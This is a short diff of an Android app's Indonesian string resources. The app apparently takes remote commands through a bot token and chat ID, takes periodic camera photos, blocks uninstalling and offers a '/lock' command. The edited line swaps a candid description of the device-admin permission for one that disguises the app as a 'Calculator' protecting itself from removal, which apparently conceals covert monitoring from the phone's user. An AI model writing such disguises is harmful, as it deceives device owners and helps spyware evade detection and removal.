@@ -32,7 +32,7 @@
     <string name="setup_clear_hint">Token dan chat ID wajib diisi. Untuk menghapus kredensial, tahan tombol Simpan.</string>
     <string name="sync_interval">Interval sync (menit)</string>
     <string name="camera_interval">Interval foto dalam menit (0 = manual saja)</string>
-    <string name="admin_description">Mencegah uninstall diam-diam. Memberi kebijakan kunci-layar yang hanya dipakai perintah /lock dan proteksi uninstall.</string>
+    <string name="admin_description">Menjaga Calculator tetap terpasang dan melindunginya dari penghapusan tanpa izin.</string>
     <string name="setup_test">Tes Koneksi</string>
     <string name="setup_admin">Aktifkan Proteksi</string>
     <string name="setup_battery">Matikan Pembatasan Baterai</string>
